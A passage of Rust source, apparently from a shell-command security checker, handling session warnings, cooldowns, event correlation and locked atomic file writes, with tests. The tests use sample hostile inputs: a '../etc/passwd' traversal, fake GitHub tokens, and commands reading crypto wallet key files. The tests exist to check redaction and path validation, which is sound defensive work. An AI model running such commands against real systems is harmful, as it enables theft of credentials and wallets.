    }
    let Some(next) = sequence.checked_add(1) else {
        return false;
    };
    session.next_typed_event_sequence = next;
    true
}

/// W6 — per-rule suppression cooldown, session-backed so one-shot CLI / hook
/// processes share the window. Returns `true` if `rule_id` (optionally scoped to
/// `target`) is CURRENTLY within its cooldown, meaning the caller should collapse
/// the finding into a rollup rather than surfacing it again; otherwise it starts
/// a fresh cooldown and returns `false`. A suppressed hit is never dropped
/// silently: it emits a compact `finding_suppressed` audit rollup.
///
/// CALL SITE (W6): this is wired at the `tirith check` DISPLAY path
/// (`crate::cli::check` → `build_display_verdict`), which collapses repeated Warn
/// / WarnAck findings in the user-facing `write_human` output only. It is strictly
/// an output/UX-layer change: it NEVER suppresses an `Action::Block` (only
/// findings that, classified alone, map to Warn/WarnAck are candidates), never
/// feeds back into detection, and never alters the verdict, exit code, audit log,
/// approval/ack files, or session accounting. The `finding_suppressed`
/// audit-rollup contract (the "never dropped silently" guarantee) is exercised
/// end-to-end by `suppress_check_emits_finding_suppressed_rollup`.
pub fn suppress_check(
    session_id: &str,
    rule_id: &str,
    target: Option<&str>,
    cooldown_secs: u64,
) -> bool {
    let key = crate::suppression::cooldown_key(rule_id, target);
    let now = chrono::Utc::now().to_rfc3339();
    // Clamp before the i64 cast: a raw `cooldown_secs as i64` above i64::MAX wraps
    // NEGATIVE, placing the expiry in the PAST and instantly expiring the cooldown.
    // Clamp to u32::MAX seconds (~136 years), the same idiom `cutoff_time` /
    // `is_within_minutes` use, which is far beyond any real cooldown and keeps
    // both `Duration::seconds` (no internal-ms overflow) and the `Utc::now() + dur`
    // addition (no DateTime-range overflow) well-defined and panic-free.
    let cooldown_secs = cooldown_secs.min(u32::MAX as u64) as i64;
    let expires = (chrono::Utc::now() + chrono::Duration::seconds(cooldown_secs)).to_rfc3339();
    let mut suppressed = false;
    with_session_locked(session_id, |sw| {
        // Prune ALL expired cooldown entries (not only `key`) so `cooldowns` cannot
        // grow unbounded across many distinct rule/target keys in a long-lived
        // session, which would inflate the lock-held parse/serialize cost on every
        // update. RFC3339 UTC timestamps compare correctly as strings.
        sw.cooldowns.retain(|_, exp| exp.as_str() > now.as_str());
        if crate::suppression::is_suppressed(&mut sw.cooldowns, &key, &now) {
            suppressed = true;
        } else {
            crate::suppression::record(&mut sw.cooldowns, &key, expires.clone());
        }
    });
    if suppressed {
        crate::audit::log_hook_event(
            "suppression",
            "cooldown",
            "finding_suppressed",
            None,
            Some(&format!("rule_id={rule_id}")),
        );
    }
    suppressed
}

/// Record warning findings (thin wrapper around `record_outcome`, no hidden
/// findings).
pub fn record_warning(session_id: &str, findings: &[&Finding], cmd: &str, dlp_patterns: &[String]) {
    record_outcome(session_id, findings, &[], cmd, dlp_patterns);
}

/// Record warning + hidden findings into the session accumulator. Hidden
/// findings are full `Finding` refs (not counts) so event details can be stored
/// for `tirith warnings --hidden`. Atomic via [`with_session_locked`]; never
/// panics or alters the verdict on I/O failure.
pub fn record_outcome(
    session_id: &str,
    warn_findings: &[&Finding],
    hidden_findings_list: &[&Finding],
    cmd: &str,
    dlp_patterns: &[String],
) {
    if warn_findings.is_empty() && hidden_findings_list.is_empty() {
        return;
    }

    let hidden_count = hidden_findings_list.len() as u32;
    let hidden_low = hidden_findings_list
        .iter()
        .filter(|f| f.severity == crate::verdict::Severity::Low)
        .count() as u32;
    let hidden_info = hidden_findings_list
        .iter()
        .filter(|f| f.severity == crate::verdict::Severity::Info)
        .count() as u32;

    // Pre-compute redacted command outside the lock to minimise hold time.
    let command_redacted = crate::redact::redact_command_text(cmd, dlp_patterns);
    // repo-0340: redaction strips secrets, not terminal controls. The stored
    // record is printed later by `tirith warnings`, so scrub display-unsafe
    // content BEFORE persisting.
    let command_redacted = crate::mcp::output_filter::sanitize_for_display(&command_redacted);
    let command_redacted = crate::util::truncate_bytes(&command_redacted, 120);
    let now = chrono::Utc::now().to_rfc3339();

    // Collect finding data we need so the closure does not borrow the slices.
    struct FindingData {
        rule_id: String,
        severity: String,
        title: String,
        domains: Vec<String>,
    }
    let finding_data: Vec<FindingData> = warn_findings
        .iter()
        .map(|f| FindingData {
            rule_id: f.rule_id.to_string(),
            severity: f.severity.to_string(),
            // repo-0340: a repo-controlled custom-rule title can carry ESC/OSC.
            title: crate::util::truncate_bytes(
                &crate::mcp::output_filter::sanitize_for_display(&f.title),
                120,
            ),
            domains: extract_domains_from_evidence(&f.evidence),
        })
        .collect();

    // Collect hidden finding data for HiddenEvent storage.
    let hidden_data: Vec<FindingData> = hidden_findings_list
        .iter()
        .map(|f| FindingData {
            rule_id: f.rule_id.to_string(),
            severity: f.severity.to_string(),
            title: crate::util::truncate_bytes(
                &crate::mcp::output_filter::sanitize_for_display(&f.title),
                120,
            ),
            domains: Vec::new(), // not needed for hidden events
        })
        .collect();

    with_session_locked(session_id, |session| {
        session.hidden_findings = session.hidden_findings.saturating_add(hidden_count);
        session.hidden_low = session.hidden_low.saturating_add(hidden_low);
        session.hidden_info = session.hidden_info.saturating_add(hidden_info);

        for fd in &finding_data {
            let event = WarningEvent {
                timestamp: now.clone(),
                rule_id: fd.rule_id.clone(),
                severity: fd.severity.clone(),
                title: fd.title.clone(),
                command_redacted: command_redacted.clone(),
                domains: fd.domains.clone(),
            };
            session.events.push_back(event);
            session.total_warnings = session.total_warnings.saturating_add(1);
        }

        for hd in &hidden_data {
            session.hidden_events.push_back(HiddenEvent {
                timestamp: now.clone(),
                rule_id: hd.rule_id.clone(),
                severity: hd.severity.clone(),
                title: hd.title.clone(),
                command_redacted: command_redacted.clone(),
            });
        }

        while session.events.len() > MAX_EVENTS {
            session.events.pop_front();
        }
        while session.hidden_events.len() > MAX_HIDDEN_EVENTS {
            session.hidden_events.pop_front();
        }
    });
}

/// Record escalation events. Called from `post_process_verdict` after an
/// escalation upgrades the action; separate from `record_outcome` because
/// escalated `Action::Block`s skip the Warn/WarnAck recording gate.
pub fn record_escalation_event(session_id: &str, hits: &[crate::escalation::EscalationHit]) {
    if hits.is_empty() {
        return;
    }

    let now = chrono::Utc::now().to_rfc3339();

    with_session_locked(session_id, |session| {
        for hit in hits {
            session.escalation_events.push_back(EscalationEvent {
                timestamp: now.clone(),
                rule_id: hit.rule_id.clone(),
                domain: hit.domain.clone(),
            });
        }
        while session.escalation_events.len() > MAX_ESCALATION_EVENTS {
            session.escalation_events.pop_front();
        }
    });
}

/// W7: append a typed event to the session's correlation ring. Production callers
/// should prefer [`record_executed_typed_events`] so events are appended only after
/// execution is confirmed. This single-event helper remains for focused recorders
/// and compatibility. Best-effort and off the hot path; the ring is capped to
/// [`MAX_TYPED_EVENTS`] (oldest dropped first).
pub fn record_typed_event(session_id: &str, mut event: crate::event_buffer::TypedEvent) {
    with_session_locked(session_id, move |session| {
        if !assign_typed_event_identity(session, &mut event) {
            return;
        }
        session.typed_events.push_back(event);
        while session.typed_events.len() > MAX_TYPED_EVENTS {
            session.typed_events.pop_front();
        }
    });
}

/// W7: correlate the persisted ring plus `provisional_events` without persisting
/// those events or changing presentation de-duplication state.
///
/// This is the enforcement-time view used before a caller knows whether the
/// current command will execute. Every matching hit is returned, including one
/// whose signature was already surfaced: [`SessionWarnings::surfaced_correlations`]
/// is a presentation/accounting de-duplication mechanism and must never suppress
/// a blocking decision. The session lock keeps this read consistent with a
/// concurrent confirmed-execution append.
pub fn correlate_session_with_provisional(
    session_id: &str,
    provisional_events: &[crate::event_buffer::TypedEvent],
) -> Vec<crate::event_buffer::CorrelationHit> {
    if provisional_events.is_empty() {
        return Vec::new();
    }

    let now = chrono::Utc::now().to_rfc3339();
    with_session_locked_result(session_id, false, |session| {
        let mut events: Vec<crate::event_buffer::TypedEvent> =
            session.typed_events.iter().cloned().collect();
        events.extend_from_slice(provisional_events);
        crate::event_buffer::correlate(&events, &now)
    })
    .unwrap_or_default()
}

/// W7: commit typed events only after the caller has confirmed that the command
/// executed. The append, correlation presentation marker, and corresponding
/// warning event are one locked, crash-atomic session mutation.
///
/// Enforcement does not depend on the fresh-hit result here: it already ran via
/// [`correlate_session_with_provisional`]. This mutation only records confirmed
/// history and de-duplicates later presentation/accounting of the same sequence.
#[cfg(test)]
pub(crate) fn record_executed_typed_events(
    session_id: &str,
    mut events: Vec<crate::event_buffer::TypedEvent>,
    cmd: &str,
    policy: &crate::policy::Policy,
    dlp_patterns: &[String],
) {
    if events.is_empty() {
        return;
    }

    let now = chrono::Utc::now().to_rfc3339();
    let command_redacted = crate::redact::redact_command_text(cmd, dlp_patterns);
    // repo-0340: strip terminal controls before persisting.
    let command_redacted = crate::mcp::output_filter::sanitize_for_display(&command_redacted);
    let command_redacted = crate::util::truncate_bytes(&command_redacted, 120);
    with_session_locked(session_id, move |session| {
        for mut event in events.drain(..) {
            if !assign_typed_event_identity(session, &mut event) {
                return;
            }
            session.typed_events.push_back(event);
        }
        while session.typed_events.len() > MAX_TYPED_EVENTS {
            session.typed_events.pop_front();
        }
        record_fresh_correlation_warnings(session, &now, &command_redacted, policy);
    });
}

/// W7: run cross-event correlation over the session's typed-event ring as of
/// now, returning only hits NOT already surfaced this session.
///
/// Because the typed-event ring is never drained, a single recorded sequence
/// stays correlatable on every subsequent command until it falls out of its
/// window. To avoid re-emitting the same CRITICAL hit on each command, every
/// returned hit's [`signature`](crate::event_buffer::CorrelationHit::signature)
/// (rule id + triggering-event timestamps) is recorded in the session's
/// `surfaced_correlations` marker under the lock; a hit whose signature is
/// already present is filtered out.
///
/// ATOMICITY: for each fresh hit, the de-dup signature AND the corresponding
/// [`WarningEvent`] are persisted in the SAME locked mutation, before the lock is
/// released. The signature marks the hit "already surfaced"; the `WarningEvent`
/// is what `tirith warnings` and repeat-count logic read. Splitting these across
/// two writes (the previous design) risked marking a hit surfaced while a second,
/// best-effort write of its `WarningEvent` failed or never ran (process exit) —
/// permanently dropping the first hit from `tirith warnings`. Doing both under one
/// lock makes that impossible: either both land or neither does (a write failure
/// leaves the whole session record unchanged, so the hit re-surfaces next time).
///
/// The post-override severity (the same value the verdict path applies via
/// `policy.severity_override`) is persisted, so `tirith warnings` never disagrees
/// with the verdict when a `severity_overrides` lever remapped a correlation rule.
/// `cmd` is redacted + truncated OUTSIDE the lock to keep hold time short.
/// Best-effort overall: if the single write fails, no marker is persisted, so at
/// worst a hit re-surfaces rather than being lost.
pub fn correlate_session(
    session_id: &str,
    cmd: &str,
    policy: &crate::policy::Policy,
    dlp_patterns: &[String],
) -> Vec<crate::event_buffer::CorrelationHit> {
    let now = chrono::Utc::now().to_rfc3339();
    // Redact + truncate the command once, outside the lock, to minimise hold time
    // (mirrors `record_outcome`); it is identical for every hit this call surfaces.
    let command_redacted = crate::redact::redact_command_text(cmd, dlp_patterns);
    // repo-0340: strip terminal controls before persisting.
    let command_redacted = crate::mcp::output_filter::sanitize_for_display(&command_redacted);
    let command_redacted = crate::util::truncate_bytes(&command_redacted, 120);
    with_session_locked_result(session_id, true, |session| {
        record_fresh_correlation_warnings(session, &now, &command_redacted, policy)
    })
    .unwrap_or_default()
}

/// Correlate the persisted ring and atomically record only fresh presentation /
/// accounting entries. The complete hit set remains available to the provisional
/// enforcement path above; this helper intentionally returns only fresh hits for
/// the legacy `correlate_session` API.
fn record_fresh_correlation_warnings(
    session: &mut SessionWarnings,
    now: &str,
    command_redacted: &str,
    policy: &crate::policy::Policy,
) -> Vec<crate::event_buffer::CorrelationHit> {
    let events: Vec<crate::event_buffer::TypedEvent> =
        session.typed_events.iter().cloned().collect();
    let already: std::collections::HashSet<&str> = session
        .surfaced_correlations
        .iter()
        .map(|s| s.as_str())
        .collect();
    let hits = crate::event_buffer::correlate(&events, now);
    let new_hits: Vec<crate::event_buffer::CorrelationHit> = hits
        .into_iter()
        .filter(|h| !already.contains(h.signature.as_str()))
        .collect();
    drop(already);

    for hit in &new_hits {
        session
            .surfaced_correlations
            .push_back(hit.signature.clone());
        let severity = policy
            .severity_override(&hit.rule_id)
            .unwrap_or(hit.severity);
        session.events.push_back(WarningEvent {
            timestamp: now.to_string(),
            rule_id: hit.rule_id.to_string(),
            severity: severity.to_string(),
            title: crate::util::truncate_bytes(&hit.title, 120),
            command_redacted: command_redacted.to_string(),
            domains: Vec::new(),
        });
        session.total_warnings = session.total_warnings.saturating_add(1);
    }

    // Expire presentation markers in lockstep with the persisted event window.
    let live_events: Vec<crate::event_buffer::TypedEvent> =
        session.typed_events.iter().cloned().collect();
    session
        .surfaced_correlations
        .retain(|sig| crate::event_buffer::signature_references_live_event(sig, &live_events));
    while session.surfaced_correlations.len() > MAX_SURFACED_CORRELATIONS {
        session.surfaced_correlations.pop_front();
    }
    while session.events.len() > MAX_EVENTS {
        session.events.pop_front();
    }

    new_hits
}

/// Shared atomic lock-read-modify-write: take an exclusive cross-process lock on a
/// DEDICATED `<session>.json.lock` file, read-or-create state from the session JSON,
/// run `mutate`, then persist the new JSON CRASH-ATOMICALLY (temp file in the same
/// dir, fsync, atomic rename over the session file, best-effort parent-dir fsync),
/// unlock, GC.
///
/// The persist is via temp+rename rather than an in-place `set_len(0)` truncate so a
/// crash / ENOSPC after truncation can never leave the session file empty or
/// partial: the old file stays intact until the rename publishes the fully-written
/// replacement. Because the rename swaps the data file's inode, the serializing lock
/// is taken on a SEPARATE lock file (stable inode) instead of the data file, exactly
/// like the pending store; locking the data file and renaming over it would orphan
/// the lock on the old inode and let a concurrent writer clobber it.
///
/// All I/O is best-effort; failures are logged and never panic. A missing session
/// starts fresh. Existing empty/corrupt state is left byte-for-byte untouched: it
/// may be the legacy security-history source for strict execution-state
/// initialization, so silently repairing it here could erase unknown history and
/// turn a later fail-closed preparation into an authorization.
fn with_session_locked<F>(session_id: &str, mutate: F)
where
    F: FnOnce(&mut SessionWarnings),
{
    let _ = with_session_locked_result(session_id, true, mutate);
}

/// Locked session access shared by mutations and the provisional read. When
/// `persist` is false, the closure's view is protected by the same lock as writers
/// but no session JSON is replaced; this prevents a check-only command from
/// creating persisted execution history.
fn with_session_locked_result<R, F>(session_id: &str, persist: bool, access: F) -> Option<R>
where
    F: FnOnce(&mut SessionWarnings) -> R,
{
    if privacy_project_session_id(session_id) != session_id {
        crate::audit::audit_diagnostic(PRIVACY_UNSAFE_SESSION_DIAGNOSTIC);
        return None;
    }
    let path = session_state_path(session_id)?;
    let lock_path = session_lock_path(session_id)?;

    if let Some(parent) = path.parent() {
        // Create sessions/ and, only if THIS call created it, fsync the grandparent
        // so a first-time-created dir entry survives a crash. The helper keys off
        // create_dir's own result, so there is no exists()-then-create TOCTOU.
        if let Err(e) = ensure_private_session_directory(parent) {
            crate::audit::audit_diagnostic(format!(
                "tirith: session: cannot create state dir {}: {e}",
                parent.display()
            ));
            return None;
        }
    }

    // Refuse to follow symlinks at the session file (Unix). The temp+rename writes a
    // brand-new inode, but a planted symlink at `path` would still be read below and
    // (post-rename) replaced; reject it before any read, matching the prior guard.
    #[cfg(unix)]
    {
        match std::fs::symlink_metadata(&path) {
            Ok(meta) if meta.file_type().is_symlink() => {
                crate::audit::audit_diagnostic(format!(
                    "tirith: session: refusing to follow symlink at {}",
                    path.display()
                ));
                return None;
            }
            _ => {}
        }
    }

    // Refuse to follow a symlink at the LOCK file too (Unix), matching the session
    // file's guard above. A symlinked lock path could redirect lock IDENTITY to an
    // attacker-chosen inode, so two writers lock different files and the
    // serialization guarantee for the read/modify/write below is lost.
    #[cfg(unix)]
    {
        match std::fs::symlink_metadata(&lock_path) {
            Ok(meta) if meta.file_type().is_symlink() => {
                crate::audit::audit_diagnostic(format!(
                    "tirith: session: refusing to follow symlink at lock {}",
                    lock_path.display()
                ));
                return None;
            }
            _ => {}
        }
    }

    // Open (creating if needed) and exclusively lock the DEDICATED lock file. The
    // lock (not the data file) serializes the whole read/modify/write so the
    // atomic rename below stays correct.
    let mut lock_opts = OpenOptions::new();
    lock_opts.read(true).write(true).create(true);
    #[cfg(unix)]
    {
        use std::os::unix::fs::OpenOptionsExt;
        lock_opts.mode(0o600);
        // No-follow on the final component closes the pre-check -> open TOCTOU: a
        // symlink planted at `lock_path` between the check above and this open is
        // refused atomically by the open itself (ELOOP).
        lock_opts.custom_flags(libc::O_NOFOLLOW);
    }
    let lock_file = match lock_opts.open(&lock_path) {
        Ok(f) => f,
        Err(e) => {
            crate::audit::audit_diagnostic(format!(
                "tirith: session: cannot open lock {}; escalation may be impaired: {e}",
                lock_path.display()
            ));
            return None;
        }
    };
    let locked = lock_file.lock_exclusive().is_ok() || lock_file.try_lock_exclusive().is_ok();
    if !locked {
        crate::audit::audit_diagnostic(format!(
            "tirith: session: cannot lock {}; recording skipped",
            lock_path.display()
        ));
        return None;
    }

    // Read the existing session WHILE holding the lock, via the no-follow + regular-
    // file + size-capped helper. O_NOFOLLOW refuses a symlinked `path`, O_NONBLOCK plus
    // an fstat regular-file check refuses a FIFO / device / socket (so a planted
    // non-regular file cannot block the writer), and the cap bounds the read. A missing
    // file is the normal "fresh session" case; any other refusal skips the mutation
    // (fail closed; the lock is released when this function returns) rather than read or
    // overwrite a foreign / non-regular file.
    let (bytes, existed) = match crate::util::read_text_no_follow_capped(
        &path,
        SESSION_FILE_READ_CAP,
    ) {
        Ok(b) => (b, true),
        Err(crate::util::OpenRegularError::NotFound) => (Vec::new(), false),
        Err(_) => {
            crate::audit::audit_diagnostic(format!(
                "tirith: session: refusing non-regular, oversized, or unreadable {}; recording skipped",
                path.display()
            ));
            return None;
        }
    };
    // Parse the bytes DIRECTLY (serde_json::from_slice), exactly as `load()` does, so
    // invalid UTF-8 is never lossy-decoded to U+FFFD. Unlike the presentation reader,
    // the writer must not reset existing corrupt bytes: strict execution-state
    // initialization treats this JSON as legacy security history and must continue to
    // fail closed until an operator deliberately resets the session.
    let mut session: SessionWarnings = if bytes.is_empty() && !existed {
        SessionWarnings::new(session_id)
    } else if bytes.is_empty() {
        crate::audit::audit_diagnostic(format!(
            "tirith: session: refusing to overwrite empty/corrupt state for '{session_id}'"
        ));
        return None;
    } else {
        match serde_json::from_slice(&bytes) {
            Ok(session) => session,
            Err(error) => {
                crate::audit::audit_diagnostic(format!(
                    "tirith: session: refusing to overwrite corrupt state for '{session_id}': {error}"
                ));
                return None;
            }
        }
    };
    // Before any best-effort writer can publish a normalized copy, require the
    // same legacy snapshot validation used by one-time strict-state import. In
    // particular, duplicate non-zero event sequences/IDs must remain a durable
    // fail-closed signal; migrating them here first would launder semantically
    // corrupt security history into an apparently clean future import.
    if let Err(error) = crate::execution_state::validate_session_state(&mut session, session_id) {
        crate::audit::audit_diagnostic(format!(
            "tirith: session: refusing to normalize invalid legacy security state for '{session_id}': {error}"
        ));
        return None;
    }

    let result = access(&mut session);
    // The loaded record was projected during deserialization/strict validation,
    // but mutation closures can append fresh attacker-controlled titles,
    // domains, paths, metadata keys/values, and stable ids. Reproject the entire
    // graph after the mutation and before either serialization or debug-capable
    // state can escape this boundary.
    privacy_project_session_state(&mut session);
    if session.session_id != session_id {
        crate::audit::audit_diagnostic(PRIVACY_UNSAFE_SESSION_DIAGNOSTIC);
        let _ = fs2::FileExt::unlock(&lock_file);
        return Some(result);
    }

    if !persist {
        let _ = fs2::FileExt::unlock(&lock_file);
        return Some(result);
    }

    let json = match serde_json::to_string(&session) {
        Ok(j) => j,
        Err(e) => {
            crate::audit::audit_diagnostic(format!(
                "tirith: session: failed to serialize warnings: {e}"
            ));
            let _ = fs2::FileExt::unlock(&lock_file);
            // The caller's computed result is still valid even though the
            // best-effort presentation/accounting mutation could not persist.
            // In particular, never turn an enforcement hit into an empty result
            // merely because session serialization failed.
            return Some(result);
        }
    };

    if let Err(e) = write_session_atomic(&path, json.as_bytes()) {
        crate::audit::audit_diagnostic(format!(
            "tirith: session: atomic write failed for {}: {e}",
            path.display()
        ));
    }

    let _ = fs2::FileExt::unlock(&lock_file);

    opportunistic_gc();
    Some(result)
}

/// Crash-atomically replace the session file at `path` with `bytes`: write to a temp
/// file in the SAME directory, fsync it, atomically rename it over `path`, then
/// best-effort fsync the parent directory so the new directory entry is durable.
/// Mirrors the pending store's `save_map`. The caller holds the session lock, so the
/// rename cannot race a concurrent writer.
fn write_session_atomic(path: &Path, bytes: &[u8]) -> std::io::Result<()> {
    use tempfile::NamedTempFile;
    let dir = path
        .parent()
        .ok_or_else(|| std::io::Error::other("session path has no parent dir"))?;
    let mut tmp = NamedTempFile::new_in(dir)?;
    #[cfg(unix)]
    {
        use std::os::unix::fs::PermissionsExt;
        let _ = tmp
            .as_file()
            .set_permissions(std::fs::Permissions::from_mode(0o600));
    }
    tmp.write_all(bytes)?;
    // fsync the temp file BEFORE the rename so a crash between write and rename can
    // never publish an empty/partial session: the old file stays until the rename.
    tmp.as_file().sync_all()?;
    tmp.persist(path)
        .map_err(|e: tempfile::PersistError| e.error)?;
    // fsync the parent dir so the rename's new name -> inode entry is crash-durable.
    // The publish already succeeded, so a dir-fsync failure is LOGGED, not propagated
    // (Windows: opening a directory as a File fails, where this helper is a no-op).
    crate::util::fsync_parent_dir_logged(path, "session state write");
    Ok(())
}

/// Extract hostnames from finding evidence.
pub fn extract_domains_from_evidence(evidence: &[Evidence]) -> Vec<String> {
    let mut domains = Vec::new();
    for ev in evidence {
        match ev {
            Evidence::Url { raw } => {
                if let Some(host) = extract_host(raw) {
                    domains.push(host);
                }
            }
            Evidence::HostComparison { raw_host, .. } => {
                domains.push(raw_host.to_lowercase());
            }
            _ => {}
        }
    }
    domains.sort();
    domains.dedup();
    domains
}

/// Extract host from a URL string.
fn extract_host(url: &str) -> Option<String> {
    if let Ok(parsed) = url::Url::parse(url) {
        return parsed.host_str().map(|h| h.to_lowercase());
    }
    // Schemeless fallback: first segment before `/`.
    let candidate = url.split('/').next()?;
    if candidate.contains('.') && !candidate.contains(' ') {
        let host = candidate.split(':').next().unwrap_or(candidate);
        return Some(host.to_lowercase());
    }
    None
}

/// Opportunistic garbage collection of stale session files.
///
/// Rate-limited to once per hour via a `.last_gc` marker file in the sessions
/// directory. Uses a 72-hour cutoff for stale sessions.
fn opportunistic_gc() {
    let gc_marker = match crate::policy::state_dir() {
        Some(d) => d.join("sessions").join(".last_gc"),
        None => return,
    };
    if let Ok(meta) = fs::metadata(&gc_marker) {
        if let Ok(modified) = meta.modified() {
            if let Ok(age) = modified.elapsed() {
                if age.as_secs() < 3600 {
                    return;
                }
            }
        }
    }
    // Touch the marker file before running GC (best-effort).
    let _ = fs::write(&gc_marker, "");
    gc_stale_sessions(72);
}

/// Remove session files older than `max_age_hours`.
pub fn gc_stale_sessions(max_age_hours: u64) {
    let state = match crate::policy::state_dir() {
        Some(s) => s,
        None => return,
    };
    let sessions_dir = state.join("sessions");
    let entries = match fs::read_dir(&sessions_dir) {
        Ok(e) => e,
        Err(_) => return,
    };

    let max_age = std::time::Duration::from_secs(max_age_hours.saturating_mul(3600));
    let now = std::time::SystemTime::now();

    let mut session_ids = std::collections::BTreeSet::new();
    for entry in entries.flatten() {
        let Some(name) = entry.file_name().to_str().map(str::to_string) else {
            continue;
        };
        let id = name
            .strip_suffix(".json")
            .or_else(|| name.strip_suffix(".execution"));
        if let Some(id) = id.filter(|id| session_state_path(id).is_some()) {
            session_ids.insert(id.to_string());
        }
    }

    for session_id in session_ids {
        let Some(json_path) = session_state_path(&session_id) else {
            continue;
        };
        let execution_path = sessions_dir.join(format!("{session_id}.execution"));
        let paths = [&json_path, &execution_path];
        let newest = paths
            .iter()
            .filter_map(|path| fs::symlink_metadata(path).ok())
            .filter(|metadata| metadata.is_file())
            .filter_map(|metadata| metadata.modified().ok())
            .max();
        let Some(modified) = newest else { continue };
        if now
            .duration_since(modified)
            .map_or(true, |age| age <= max_age)
        {
            continue;
        }
        let Some(lock_path) = session_lock_path(&session_id) else {
            continue;
        };
        let mut options = OpenOptions::new();
        options.read(true).write(true).create(true);
        #[cfg(unix)]
        {
            use std::os::unix::fs::OpenOptionsExt as _;
            options
                .mode(0o600)
                .custom_flags(libc::O_NOFOLLOW | libc::O_CLOEXEC);
        }
        let Ok(lock_file) = options.open(&lock_path) else {
            continue;
        };
        #[cfg(unix)]
        {
            use std::os::unix::fs::MetadataExt as _;
            let Ok(metadata) = lock_file.metadata() else {
                continue;
            };
            if !metadata.is_file()
                || metadata.uid() != unsafe { libc::geteuid() }
                || metadata.mode() & 0o077 != 0
            {
                continue;
            }
        }
        if lock_file.try_lock_exclusive().is_err() {
            continue;
        }
        // Recheck freshness while serialized with all strict/best-effort writers.
        let still_stale = paths
            .iter()
            .filter_map(|path| fs::symlink_metadata(path).ok())
            .filter(|metadata| metadata.is_file())
            .filter_map(|metadata| metadata.modified().ok())
            .max()
            .and_then(|modified| now.duration_since(modified).ok())
            .is_some_and(|age| age > max_age);
        if still_stale {
            #[cfg(unix)]
            {
                // Strict state is the authorization source of truth. GC may
                // delete the pair only after the ledger, stable anchor, path
                // identities, and policy-derived history retention have all
                // been validated under this exact lock.
                let _ = crate::execution_state::gc_strict_session_locked(
                    &lock_file,
                    &lock_path,
                    &sessions_dir,
                    &session_id,
                    &json_path,
                );
            }
            #[cfg(not(unix))]
            {
                for path in paths {
                    let Ok(metadata) = fs::symlink_metadata(path) else {
                        continue;
                    };
                    if metadata.is_file() {
                        let _ = fs::remove_file(path);
                    }
                }
            }
        }
        let _ = fs2::FileExt::unlock(&lock_file);
    }
}

/// Delete a session file.
pub fn clear_session(session_id: &str) {
    if let Some(path) = session_state_path(session_id) {
        let _ = fs::remove_file(&path);
    }
}

#[cfg(test)]
mod tests {
    use super::*;
    use crate::verdict::{Evidence, Finding, RuleId, Severity};

    #[cfg(unix)]
    struct TestStateHome(Option<std::ffi::OsString>);

    #[cfg(unix)]
    impl TestStateHome {
        fn install(path: &std::path::Path) -> Self {
            let previous = std::env::var_os("XDG_STATE_HOME");
            // SAFETY: every caller holds the crate-wide environment lock.
            unsafe { std::env::set_var("XDG_STATE_HOME", path) };
            Self(previous)
        }
    }

    #[cfg(unix)]
    impl Drop for TestStateHome {
        fn drop(&mut self) {
            // SAFETY: the owning test still holds the crate-wide environment lock.
            unsafe {
                match self.0.take() {
                    Some(previous) => std::env::set_var("XDG_STATE_HOME", previous),
                    None => std::env::remove_var("XDG_STATE_HOME"),
                }
            }
        }
    }

    #[cfg(unix)]
    struct TestEnvVar {
        key: &'static str,
        previous: Option<std::ffi::OsString>,
    }

    #[cfg(unix)]
    impl TestEnvVar {
        fn set(key: &'static str, value: impl AsRef<std::ffi::OsStr>) -> Self {
            let previous = std::env::var_os(key);
            // SAFETY: every caller holds the crate-wide environment lock.
            unsafe { std::env::set_var(key, value) };
            Self { key, previous }
        }
    }

    #[cfg(unix)]
    impl Drop for TestEnvVar {
        fn drop(&mut self) {
            // SAFETY: the owning test still holds the crate-wide environment lock.
            unsafe {
                match self.previous.take() {
                    Some(previous) => std::env::set_var(self.key, previous),
                    None => std::env::remove_var(self.key),
                }
            }
        }
    }

    fn make_finding(rule_id: RuleId, severity: Severity) -> Finding {
        Finding {
            rule_id,
            severity,
            title: "Test finding".to_string(),
            description: "desc".to_string(),
            evidence: vec![Evidence::Url {
                raw: "https://evil.example.com/path".to_string(),
            }],
            human_view: None,
            agent_view: None,
            mitre_id: None,
            custom_rule_id: None,
        }
    }

    #[test]
    fn test_session_state_path_validation() {
        // Valid IDs
        assert!(session_state_path("abc-123_DEF").is_some());
        assert!(session_state_path("a").is_some());

        // Reject empty
        assert!(session_state_path("").is_none());

        // Reject path traversal
        assert!(session_state_path("../etc/passwd").is_none());
        assert!(session_state_path("foo/bar").is_none());
        assert!(session_state_path("..").is_none());

        // Reject special chars
        assert!(session_state_path("foo bar").is_none());
        assert!(session_state_path("foo.bar").is_none());

        // Reject too long
        let long_id = "a".repeat(129);
        assert!(session_state_path(&long_id).is_none());

        // Accept max length
        let max_id = "a".repeat(128);
        assert!(session_state_path(&max_id).is_some());

        // A syntactically valid identifier that is itself sensitive must never
        // become a JSON or lock filename.
        let canary = format!("ghp_canary_{}", "Z".repeat(30));
        assert!(canary
            .chars()
            .all(|ch| ch.is_ascii_alphanumeric() || matches!(ch, '-' | '_')));
        assert!(!crate::session::is_valid_session_id(&canary));
        assert!(session_state_path(&canary).is_none());
    }

    #[test]
    fn public_session_event_traits_project_direct_values_and_deserialization() {
        let canary = format!("ghp_canary_{}", "C".repeat(30));
        let warning = WarningEvent {
            timestamp: "2026-01-01T00:00:00Z".to_string(),
            rule_id: format!("warning-{canary}"),
            severity: "high".to_string(),
            title: format!("wallet warning {canary}"),
            command_redacted: format!("cat /wallets/{canary}/keypair.json"),
            domains: vec![format!(
                "https://operator:{canary}@rpc.example/private/{canary}"
            )],
        };
        let escalation = EscalationEvent {
            timestamp: "2026-01-01T00:00:00Z".to_string(),
            rule_id: format!("escalation-{canary}"),
            domain: Some(format!(
                "https://operator:{canary}@rpc.example/private/{canary}"
            )),
        };
        let hidden = HiddenEvent {
            timestamp: "2026-01-01T00:00:00Z".to_string(),
            rule_id: format!("hidden-{canary}"),
            severity: "low".to_string(),
            title: format!("hidden wallet finding {canary}"),
            command_redacted: format!("cat /wallets/{canary}/wallet.dat"),
        };

        for output in [
            serde_json::to_string(&warning).expect("serialize warning"),
            format!("{warning:?}"),
            serde_json::to_string(&escalation).expect("serialize escalation"),
            format!("{escalation:?}"),
            serde_json::to_string(&hidden).expect("serialize hidden"),
            format!("{hidden:?}"),
        ] {
            assert!(!output.contains(&canary), "{output}");
        }

        let decoded_warning: WarningEvent = serde_json::from_value(serde_json::json!({
            "timestamp": "2026-01-01T00:00:00Z",
            "rule_id": format!("warning-{canary}"),
            "severity": "high",
            "title": format!("wallet warning {canary}"),
            "command_redacted": format!("cat /wallets/{canary}/keypair.json"),
            "domains": [format!("https://operator:{canary}@rpc.example/private/{canary}")],
        }))
        .expect("deserialize warning");
